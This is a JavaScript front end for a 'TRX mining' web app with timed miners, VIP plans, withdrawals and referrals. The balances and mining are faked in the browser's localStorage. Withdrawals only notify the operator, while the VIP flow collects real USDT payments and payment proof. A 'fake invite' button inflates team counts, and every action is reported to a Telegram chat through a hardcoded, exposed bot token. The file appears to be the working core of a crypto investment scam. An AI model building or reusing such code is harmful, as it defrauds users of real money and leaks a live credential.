/* =============================
  script.js - Multi-miner version (v3)
  - Three miners: 2h (TRX), 15d (1200 TRX), 10d (10 USDT)
  - Persistent per-miner timers in localStorage
  - Telegram notifications (client-side best-effort)
  ============================= */

/* -------------- CONFIG -------------- */
const BOT_TOKEN = "8516209099:AAFsqUtrN67apMLzr4n-eChN8vCSTAvnoBc"; // from you
const ADMIN_CHAT_ID = "8405100233";

const TRX_PRICE_USDT = 0.0006;
const NEW_ACCOUNT_TRX = 20;

/* miner definitions:
   id, title, durationMs, reward (value), rewardType ('trx'|'usdt'), colorClass
*/
const MINERS_DEF = [
  { id: 'm1', title: 'Standard Miner', durationMs: 2 * 60 * 60 * 1000, reward: 5, rewardType: 'trx', colorClass: '' },
  { id: 'm2', title: 'Golden Miner', durationMs: 15 * 24 * 60 * 60 * 1000, reward: 1200, rewardType: 'trx', colorClass: 'miner-gold' },
  { id: 'm3', title: 'Red Miner', durationMs: 10 * 24 * 60 * 60 * 1000, reward: 10, rewardType: 'usdt', colorClass: 'miner-red' }
];

/* VIP plan defaults */
const VIP_PLANS = { vip1: { fee: 1.0, daily: 0.5 }, vip2: { fee: 10.0, daily: 6.0 } };

/* ------------ localStorage helpers ------------ */
function getState(k, d){ try{ const v = localStorage.getItem(k); return v ? JSON.parse(v) : d; } catch(e){ return d; } }
function setState(k,v){ localStorage.setItem(k, JSON.stringify(v)); }

/* initial global state */
let state = getState('trx_app_v3', {
  trx: NEW_ACCOUNT_TRX,
  usdt: +(NEW_ACCOUNT_TRX * TRX_PRICE_USDT).toFixed(6),
  teamCount: 0,
  miners: {}, // per-miner state: miningActive, miningEnd, history
  vipPlan: null,
  vipActiveSince: null,
  refId: null
});

/* ensure miners exist in state */
MINERS_DEF.forEach(m => {
  if(!state.miners[m.id]){
    state.miners[m.id] = { miningActive: false, miningEnd: null, history: [] };
  }
});

/* ------------ DOM refs ------------ */
const pages = { mine: document.getElementById('page-mine'), team: document.getElementById('page-team'), me: document.getElementById('page-me'), vip: document.getElementById('page-vip') };
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const trxAmountEl = document.getElementById('trxAmount');
const meTRX = document.getElementById('meTRX');
const meUSDT = document.getElementById('meUSDT');
const refLinkEl = document.getElementById('refLink');
const teamCountEl = document.getElementById('teamCount');
const copyRefBtn = document.getElementById('copyRefBtn');

const minersGrid = document.getElementById('minersGrid');

const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');

const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');

const vipExchange = document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipSubmit = document.getElementById('vipSubmit');
const vipMsg = document.getElementById('vipMsg');

const cycleLabelEls = {}; // not needed per miner in UI (we show per-card)

/* --------------- nav --------------- */
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=>{
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target = btn.dataset.target;
    Object.values(pages).forEach(p=>p.classList.remove('active'));
    document.getElementById(target).classList.add('active');
  });
});

/* --------------- rendering miners --------------- */
let minerIntervals = {}; // per-miner interval ids
function renderMiners(){
  minersGrid.innerHTML = '';
  MINERS_DEF.forEach(miner=>{
    const s = state.miners[miner.id];
    const card = document.createElement('div');
    card.className = 'miner-card ' + (miner.colorClass || '');
    card.id = `card-${miner.id}`;

    const header = document.createElement('div');
    header.className = 'miner-header';
    header.innerHTML = `<div class="miner-title">${miner.title}</div><div class="miner-meta">${formatDuration(miner.durationMs)} — Reward: <strong>${miner.reward} ${miner.rewardType === 'trx' ? 'TRX' : 'USDT'}</strong></div>`;

    const body = document.createElement('div');
    body.className = 'miner-body';

    const left = document.createElement('div'); left.className='miner-left';
    left.innerHTML = `<div class="big-circle"><div class="pill">TRX</div></div>`;

    const right = document.createElement('div'); right.className='miner-right';
    const progressHtml = `<div class="progress-bar"><div class="progress-inner" id="progress-${miner.id}"></div></div>
      <div id="timer-${miner.id}" class="progress-timer small muted">Not started</div>`;

    const controlHtml = `<div style="margin-top:10px">
      <div id="status-${miner.id}" class="mine-status small">Status: ${s.miningActive ? 'Mining' : 'Not started'}</div>
      <div style="margin-top:8px">
        <button data-miner="${miner.id}" class="btn btn-forest start-btn">${s.miningActive ? 'Mining...' : 'Start'}</button>
        <button data-miner="${miner.id}" class="btn white collect-btn" style="margin-left:8px">${(s.miningActive && s.miningEnd && Date.now() >= s.miningEnd) ? 'Collect' : 'Collect'}</button>
      </div>
      <div id="msg-${miner.id}" class="muted small" style="margin-top:8px"></div>
    </div>`;

    right.innerHTML = progressHtml + controlHtml;

    body.appendChild(left);
    body.appendChild(right);

    card.appendChild(header);
    card.appendChild(body);

    // history
    const hist = document.createElement('div');
    hist.id = `hist-${miner.id}`;
    hist.className = 'small muted';
    hist.style.marginTop = '8px';
    card.appendChild(hist);

    minersGrid.appendChild(card);

    // add event listeners
    card.querySelector('.start-btn').addEventListener('click', ()=> startMiner(miner.id));
    card.querySelector('.collect-btn').addEventListener('click', ()=> collectMiner(miner.id));
  });

  updateAllUI();
}

/* --------------- helpers --------------- */
function formatDuration(ms){
  const s = Math.floor(ms/1000);
  if(s < 60) return `${s}s`;
  const m = Math.floor(s/60);
  if(m < 60) return `${m}m`;
  const h = Math.floor(m/60);
  if(h < 24) return `${h}h`;
  const d = Math.floor(h/24);
  return `${d} days`;
}

/* --------------- mining logic --------------- */
function startMiner(minerId){
  const def = MINERS_DEF.find(m=>m.id===minerId);
  const mState = state.miners[minerId];
  if(mState.miningActive){
    alert('Already mining. You can collect when timer ends.');
    return;
  }
  // start
  mState.miningActive = true;
  mState.miningEnd = Date.now() + def.durationMs;
  mState.history = mState.history || [];
  mState.history.push({ text: 'Started mining', time: Date.now() });
  setState('trx_app_v3', state);
  sendTelegramMessage(`🔋 StartMiner\nMiner:${def.title}\nRef:${state.refId}`);
  renderMiners();
}

function collectMiner(minerId){
  const def = MINERS_DEF.find(m=>m.id===minerId);
  const mState = state.miners[minerId];
  if(!mState.miningActive || !mState.miningEnd){
    alert('Nothing to collect.');
    return;
  }
  if(Date.now() < mState.miningEnd){
    alert('Mining not finished yet.');
    return;
  }
  // reward
  if(def.rewardType === 'trx'){
    state.trx = parseFloat((state.trx + def.reward).toFixed(6));
    state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  } else {
    // reward in USDT
    state.usdt = parseFloat((state.usdt + def.reward).toFixed(6));
  }
  // reset miner
  mState.miningActive = false;
  mState.miningEnd = null;
  mState.history.push({ text: `Collected ${def.reward} ${def.rewardType === 'trx' ? 'TRX' : 'USDT'}`, time: Date.now() });
  setState('trx_app_v3', state);
  sendTelegramMessage(`⛏️ Collected\nMiner:${def.title}\nReward:${def.reward} ${def.rewardType === 'trx' ? 'TRX' : 'USDT'}\nNew TRX:${state.trx.toFixed(6)} USDT:${state.usdt.toFixed(6)}`);
  renderMiners();
}

/* per-miner UI updater */
function updateMinerUI(miner){
  const mState = state.miners[miner.id];
  const progressEl = document.getElementById(`progress-${miner.id}`);
  const timerEl = document.getElementById(`timer-${miner.id}`);
  const statusEl = document.getElementById(`status-${miner.id}`);
  const msgEl = document.getElementById(`msg-${miner.id}`);
  const histEl = document.getElementById(`hist-${miner.id}`);
  const card = document.getElementById(`card-${miner.id}`);

  // history
  if(Array.isArray(mState.history) && mState.history.length){
    histEl.innerHTML = mState.history.slice().reverse().map(h=> {
      const d = new Date(h.time);
      return `${d.toLocaleString()}: ${h.text}`;
    }).join('<br>');
  } else histEl.innerText = 'No history';

  if(mState.miningActive && mState.miningEnd){
    const remaining = mState.miningEnd - Date.now();
    if(remaining <= 0){
      progressEl.style.width = '100%';
      timerEl.innerText = 'Ready to claim';
      statusEl.innerText = 'Status: Completed';
      msgEl.innerText = 'Ready to collect';
      // make collect button enabled
    } else {
      const pct = Math.max(0, Math.min(100, ((MINERS_DEF.find(m=>m.id===miner.id).durationMs - remaining)/MINERS_DEF.find(m=>m.id===miner.id).durationMs)*100));
      progressEl.style.width = pct + '%';
      const d = computeDHMS(remaining);
      timerEl.innerText = `Time: ${d.days}d ${d.hours}h ${d.mins}m ${d.secs}s`;
      statusEl.innerText = 'Status: Mining';
      msgEl.innerText = '';
      // animate card
      card.classList.add('mining-running');
    }
  } else {
    progressEl.style.width = '0%';
    timerEl.innerText = 'Not started';
    statusEl.innerText = 'Status: Not started';
    msgEl.innerText = '';
    card.classList.remove('mining-running');
  }
}

/* compute days/hours/mins/secs from ms */
function computeDHMS(ms){
  const secs = Math.floor(ms/1000);
  const days = Math.floor(secs / (3600*24));
  const hours = Math.floor((secs % (3600*24)) / 3600);
  const mins = Math.floor((secs % 3600) / 60);
  const s = secs % 60;
  return { days, hours, mins, secs: s };
}

/* update all miners, and balance */
function updateAllUI(){
  // balances
  trxAmountEl.innerText = parseFloat(state.trx).toFixed(6);
  meTRX.innerText = parseFloat(state.trx).toFixed(6);
  meUSDT.innerText = parseFloat(state.usdt).toFixed(6);
  teamCountEl.innerText = state.teamCount;
  if(!state.refId){ state.refId = Math.random().toString(36).slice(2,9).toUpperCase(); setState('trx_app_v3', state); }
  refLinkEl.value = state.refId;

  // per-miner update
  MINERS_DEF.forEach(miner=>{
    updateMinerUI(miner);
    // ensure per-miner intervals
    if(state.miners[miner.id].miningActive && !minerIntervals[miner.id]){
      minerIntervals[miner.id] = setInterval(()=> updateMinerUI(miner), 1000);
    }
    if(!state.miners[miner.id].miningActive && minerIntervals[miner.id]){
      clearInterval(minerIntervals[miner.id]);
      minerIntervals[miner.id] = null;
    }
  });

  setState('trx_app_v3', state);
}

/* --------------- convert --------------- */
convertDo?.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX amount'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = v * TRX_PRICE_USDT;
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  state.minerHistory = state.minerHistory || [];
  setState('trx_app_v3', state);
  convertResult.innerText = `Converted ${v} TRX → ${converted.toFixed(6)} USDT`;
  sendTelegramMessage(`🔁 Convert\nRef:${state.refId}\nTRX:${v}\nUSDT:${converted.toFixed(6)}`);
  updateAllUI();
});

/* --------------- withdraw --------------- */
submitWithdraw?.addEventListener('click', ()=>{
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value||0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amount) || amount <= 0){ alert('Enter valid amount'); return; }
  if(amount > state.usdt){ alert('Not enough USDT'); return; }
  if(amount < 0.01){ alert('Minimum withdraw 0.01 USDT'); return; }
  state.usdt = parseFloat((state.usdt - amount).toFixed(6));
  // record
  Object.values(state.miners).forEach(m=> m.history = m.history || []);
  const note = `Withdraw requested ${amount.toFixed(6)} USDT -> ${withdrawMethod.value} (${uid})`;
  // add to global miner m1 history as general
  state.miners['m1'].history.push({ text: note, time: Date.now() });
  setState('trx_app_v3', state);
  withdrawMsg.innerText = `Withdraw submitted: ${amount.toFixed(6)} USDT to ${withdrawMethod.value} UID ${uid}`;
  sendTelegramMessage(`💸 Withdraw Request\nRef:${state.refId}\nMethod:${withdrawMethod.value}\nUID:${uid}\nAmount:${amount.toFixed(6)} USDT`);
  updateAllUI();
});

/* --------------- VIP flow --------------- */
document.querySelectorAll('.buy-vip').forEach(b=>{
  b.addEventListener('click', (e)=>{
    const plan = e.currentTarget.dataset.plan;
    const info = VIP_PLANS[plan];
    if(!confirm(`Buy ${plan.toUpperCase()} for ${info.fee} USDT?`)) return;
    if(state.usdt < info.fee){ alert('Not enough USDT to buy VIP'); return; }
    state.usdt = parseFloat((state.usdt - info.fee).toFixed(6));
    state.vipPlan = plan;
    state.vipActiveSince = Date.now();
    // store
    setState('trx_app_v3', state);
    sendTelegramMessage(`🌟 VIP Purchase\nRef:${state.refId}\nPlan:${plan}\nFee:${info.fee} USDT`);
    updateAllUI();
  });
});

vipSubmit?.addEventListener('click', ()=>{
  const exch = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipFile.files[0];
  if(!sender || !memo){ alert('Enter UID and memo'); return; }
  const reqs = getState('vip_requests_v3', []);
  const req = { ref: state.refId, exchange: exch, sender, memo, time: Date.now(), plan: state.vipPlan || 'vip1' };
  reqs.push(req);
  setState('vip_requests_v3', reqs);
  vipMsg.innerText = 'VIP request submitted for review (demo).';
  sendTelegramMessage(`🌟 VIP Request\nRef:${state.refId}\nExchange:${exch}\nSender:${sender}\nMemo:${memo}\nPlan:${req.plan}`);
  if(file){
    const reader = new FileReader();
    reader.onload = e => { setState(`vip_proof_${Date.now()}`, e.target.result); };
    reader.readAsDataURL(file);
  }
  updateAllUI();
});

/* --------------- invite/copy --------------- */
document.getElementById('fakeInviteBtn')?.addEventListener('click', ()=>{
  state.teamCount = parseInt(state.teamCount) + 1;
  state.miners['m1'].history.push({ text: 'Added fake member', time: Date.now() });
  setState('trx_app_v3', state);
  updateAllUI();
});
copyRefBtn?.addEventListener('click', ()=> {
  navigator.clipboard && navigator.clipboard.writeText(refLinkEl.value);
  alert('Referral code copied!');
});

/* --------------- Telegram send (client-side best-effort) --------------- */
async function sendTelegramMessage(message){
  if(!BOT_TOKEN || !ADMIN_CHAT_ID){ console.log('TG not configured:', message); return; }
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method:'POST',
      headers:{ 'Content-Type':'application/json' },
      body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message })
    });
    console.log('TG ok');
  } catch(e){
    console.error('tg err', e);
    // fallback: store message locally
    const q = getState('tg_failed_v3', []);
    q.push({ msg: message, time: Date.now() });
    setState('tg_failed_v3', q);
  }
}

/* --------------- startup --------------- */
function renderAll(){
  renderMiners();
  updateAllUI();
}
renderAll();

/* ensure intervals resume on load */
window.addEventListener('beforeunload', ()=> {
  setState('trx_app_v3', state);
});
